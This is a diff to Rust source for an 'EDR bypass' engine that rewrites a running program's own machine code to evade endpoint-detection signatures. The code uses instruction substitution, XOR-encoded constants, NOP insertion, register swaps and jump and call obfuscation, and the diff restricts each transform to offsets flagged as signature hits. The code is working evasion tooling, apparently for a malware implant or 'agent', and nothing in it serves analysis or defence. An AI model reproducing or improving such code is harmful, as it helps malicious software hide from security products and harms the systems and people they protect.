@@ -7,18 +7,22 @@
 //!
 //! # Transformations
 //!
-//! 1. **Instruction substitution**: `mov reg, imm` → `push imm; pop reg`;
-//!    `xor rax,rax` → `sub rax,rax`; `call [rip+offset]` →
-//!    `lea r15,[rip+offset]; call r15`
-//! 2. **Register reassignment**: simplified liveness analysis over critical
-//!    syscall trampolines to swap register usage where safe (e.g., r10↔r11
-//!    in non-syscall-context code)
-//! 3. **Nop sled insertion**: semantic-equivalent nops (`xchg rax,rax`,
+//! 1. **Instruction substitution**: `xor rax,rax` → `sub rax,rax`
+//! 2. **Register reassignment**: disabled — requires full data-flow analysis
+//!    to safely swap register usage around syscall trampolines
+//! 3. **NOP sled insertion**: semantic-equivalent nops (`xchg rax,rax`,
 //!    `lea rsp,[rsp+0]`, `mov rdi,rdi`) — randomized between cycles
 //! 4. **Constant splitting**: `mov rax, 0xDEAD` →
-//!    `mov rcx, 0xDE00; add rcx, 0xAD; xchg rax,rcx`
-//! 5. **Jump obfuscation**: direct jumps → computed jumps via
-//!    `lea reg,[rip+base]; add reg,offset; jmp reg`
+//!    `mov rcx, (0xDEAD ^ key); xor rcx, key; xchg rax, rcx`
+//!    where key is a random 32-bit value.  The immediate is XOR-encoded
+//!    at rest and decoded at runtime.
+//! 5. **Register swap (rax↔rcx)**: `mov rax, imm64` → `mov rcx, imm64;
+//!    xchg rax, rcx` — fallback when constant splitting can't apply
+//!    (not enough trailing padding)
+//! 6. **Jump obfuscation**: short jmp (`EB XX`) → long jmp
+//!    (`E9 XXXXXXXX`) + NOP padding
+//! 7. **Indirect call obfuscation**: `call [rip+disp32]` →
+//!    `lea r15,[rip+disp32]; call r15`
 //!
 //! # Integration
 //!
@@ -55,6 +59,7 @@ use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
 use rand::Rng;
 use sha2::{Digest, Sha256};
+use std::collections::HashSet;
 use std::sync::atomic::{AtomicU64, AtomicU32, Ordering};
 use std::sync::Mutex;
 
@@ -264,25 +269,6 @@ fn find_pattern_offsets(data: &[u8], pattern: &[u8]) -> Vec<usize> {
         .collect()
 }
 
-/// Check if an offset falls within the exclusion zone around any `syscall`
-/// instruction in the text section.
-fn is_in_syscall_exclusion_zone(text: &[u8], offset: usize) -> bool {
-    // Find all syscall (0F 05) instructions.
-    let syscall_offsets = find_pattern_offsets(text, &[0x0F, 0x05]);
-    for &so in &syscall_offsets {
-        let zone_start = if so >= SYSCALL_STUB_EXCLUSION_BYTES {
-            so - SYSCALL_STUB_EXCLUSION_BYTES
-        } else {
-            0
-        };
-        let zone_end = (so + 2 + SYSCALL_STUB_EXCLUSION_BYTES).min(text.len());
-        if offset >= zone_start && offset < zone_end {
-            return true;
-        }
-    }
-    false
-}
-
 /// Hex-encode a byte slice.
 fn hex_encode(data: &[u8]) -> String {
     hex::encode(data)
@@ -368,14 +354,17 @@ fn build_exclusion_bitmap(text: &[u8]) -> Vec<bool> {
 /// Apply instruction substitution: `xor rax, rax` → `sub rax, rax`.
 ///
 /// Pattern: `48 31 C0` (xor rax, rax) → `48 29 C0` (sub rax, rax)
-fn transform_xor_to_sub(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_xor_to_sub(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     let pattern = [0x48, 0x31, 0xC0]; // xor rax, rax
     let replacement = [0x48, 0x29, 0xC0]; // sub rax, rax
     let offsets = find_pattern_offsets(text, &pattern);
 
     for offset in offsets {
-        if excluded[offset] {
+        if excluded.get(offset..offset + 3).map_or(true, |slice| slice.iter().any(|&b| b)) {
+            continue;
+        }
+        if !actionable.contains(&offset) {
             continue;
         }
         let before = text[offset..offset + 3].to_vec();
@@ -401,13 +390,16 @@ fn transform_xor_to_sub(text: &mut [u8], excluded: &[bool]) -> Vec<TransformReco
 /// For safety, this transformation is only applied when the replacement
 /// fits without overwriting non-NOP bytes.  In practice we look for the
 /// `FF 15` (call [rip+disp32]) encoding and check room.
-fn transform_indirect_call(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_indirect_call(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     // FF 15 XX XX XX XX = call [rip+disp32]
     let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(6)], &[0xFF, 0x15]);
 
     for offset in offsets {
         if excluded.get(offset..offset + 6).map_or(true, |z| z.iter().any(|&x| x)) {
+            continue;
+        }
+        if !actionable.contains(&offset) {
             continue;
         }
         // Read the 32-bit displacement.
@@ -459,7 +451,7 @@ fn transform_indirect_call(text: &mut [u8], excluded: &[bool]) -> Vec<TransformR
 /// Inserts random semantic NOP instructions at safe locations (after RET
 /// instructions or before existing NOP padding).  Each insertion adds 2–5
 /// bytes of semantic-equivalent NOP.
-fn transform_nop_insertion(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_nop_insertion(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     let mut rng = rand::thread_rng();
 
@@ -477,6 +469,9 @@ fn transform_nop_insertion(text: &mut [u8], excluded: &[bool]) -> Vec<TransformR
             continue;
         }
         if excluded.get(insert_off).copied().unwrap_or(true) {
+            continue;
+        }
+        if !actionable.contains(&insert_off) {
             continue;
         }
         // Check that the next few bytes are NOPs or CCs (padding room).
@@ -520,7 +515,7 @@ fn transform_nop_insertion(text: &mut [u8], excluded: &[bool]) -> Vec<TransformR
 /// **Note**: the `xchg` clobbers rcx.  If rcx is live at this point the
 /// surrounding code must not depend on its value.  The exclusion bitmap
 /// should protect critical sequences (syscall setup, etc.).
-fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
 
     // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
@@ -534,6 +529,9 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<Tr
             break;
         }
         if excluded.get(offset..offset + 10).map_or(true, |z| z.iter().any(|&x| x)) {
+            continue;
+        }
+        if !actionable.contains(&offset) {
             continue;
         }
         // Read the immediate value.
@@ -613,7 +611,7 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<Tr
 /// which needs only 2 bytes).
 ///
 /// The XOR key is a random non-zero 32-bit value, regenerated per hit.
-fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_constant_splitting(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     let mut rng = rand::thread_rng();
 
@@ -632,6 +630,9 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<Trans
             continue;
         }
         if excluded.get(offset..offset + 19).map_or(true, |z| z.iter().any(|&x| x)) {
+            continue;
+        }
+        if !actionable.contains(&offset) {
             continue;
         }
 
@@ -706,7 +707,7 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<Trans
 /// This transformation changes the byte signature of direct jumps while
 /// preserving the target address.  Requires extra room (NOPs/CCs) after the
 /// original jump.
-fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
 
     // Short jmp: EB XX (2 bytes) — replace with computed jump if room available.
@@ -714,6 +715,9 @@ fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool]) -> Vec<Transfo
 
     for offset in short_jumps {
         if excluded.get(offset..offset + 2).map_or(true, |z| z.iter().any(|&x| x)) {
+            continue;
+        }
+        if !actionable.contains(&offset) {
             continue;
         }
         // Read the relative offset.
@@ -772,7 +776,7 @@ fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool]) -> Vec<Transfo
 /// convention.  A safe implementation would require full data-flow analysis to
 /// trace r10 usage from the mov to the syscall and update every instruction in
 /// between.  For now, this transform is disabled to prevent agent instability.
-fn transform_register_reassignment(_text: &mut [u8], _excluded: &[bool]) -> Vec<TransformRecord> {
+fn transform_register_reassignment(_text: &mut [u8], _excluded: &[bool], _actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     Vec::new()
 }
 
@@ -897,19 +901,20 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     let mut all_transforms = Vec::new();
     let mut applied = 0u32;
 
-    // Filter hits by entropy threshold.
-    let actionable: Vec<&SignatureHit> = hits
+    // Filter hits by entropy threshold into a set of actionable offsets.
+    let actionable_offsets: HashSet<usize> = hits
         .iter()
         .filter(|h| {
             let region_start = h.offset.saturating_sub(32);
             let region_end = (h.offset + 32).min(text_mut.len());
             shannon_entropy(&text_mut[region_start..region_end]) < entropy_threshold
         })
+        .map(|h| h.offset)
         .collect();
 
     log::info!(
         "edr_bypass_transform: {} actionable hits out of {} total (entropy threshold: {:.1})",
-        actionable.len(),
+        actionable_offsets.len(),
         hits.len(),
         entropy_threshold,
     );
@@ -917,7 +922,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     // Apply each transformation type in order, respecting the budget.
     // 1. Instruction substitution (xor → sub).
     if applied < max_transforms {
-        let recs = transform_xor_to_sub(text_mut, &excluded);
+        let recs = transform_xor_to_sub(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -927,7 +932,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
 
     // 2. Register reassignment (r10 → r11 in non-syscall code).
     if applied < max_transforms {
-        let recs = transform_register_reassignment(text_mut, &excluded);
+        let recs = transform_register_reassignment(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -937,7 +942,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
 
     // 3. NOP sled insertion.
     if applied < max_transforms {
-        let recs = transform_nop_insertion(text_mut, &excluded);
+        let recs = transform_nop_insertion(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -945,9 +950,10 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         all_transforms.extend(recs);
     }
 
-    // 4. Register swap (rax↔rcx).
+    // 4. Constant splitting (XOR-encoded mov rax, imm64) — stronger transform,
+    //    runs first so it takes priority over the weaker register-only swap below.
     if applied < max_transforms {
-        let recs = transform_register_swap_rax_rcx(text_mut, &excluded);
+        let recs = transform_constant_splitting(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -955,9 +961,10 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         all_transforms.extend(recs);
     }
 
-    // 4.5. Constant splitting (XOR-encoded mov rax, imm64).
+    // 5. Register swap (rax↔rcx) — weaker fallback for locations where
+    //    constant splitting couldn't apply (not enough padding room).
     if applied < max_transforms {
-        let recs = transform_constant_splitting(text_mut, &excluded);
+        let recs = transform_register_swap_rax_rcx(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -965,9 +972,9 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         all_transforms.extend(recs);
     }
 
-    // 5. Jump obfuscation.
+    // 6. Jump obfuscation.
     if applied < max_transforms {
-        let recs = transform_jump_obfuscation(text_mut, &excluded);
+        let recs = transform_jump_obfuscation(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -975,9 +982,9 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         all_transforms.extend(recs);
     }
 
-    // 6. Indirect call obfuscation.
+    // 7. Indirect call obfuscation.
     if applied < max_transforms {
-        let recs = transform_indirect_call(text_mut, &excluded);
+        let recs = transform_indirect_call(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -990,7 +997,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     applied = all_transforms.len() as u32;
 
     // Step 7: Count skipped (in exclusion zone or above entropy threshold).
-    let skipped = hits.len() as u32 - applied;
+    let skipped = hits.len().saturating_sub(applied as usize) as u32;
 
     // Step 8: Hash after.
     let text_after = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
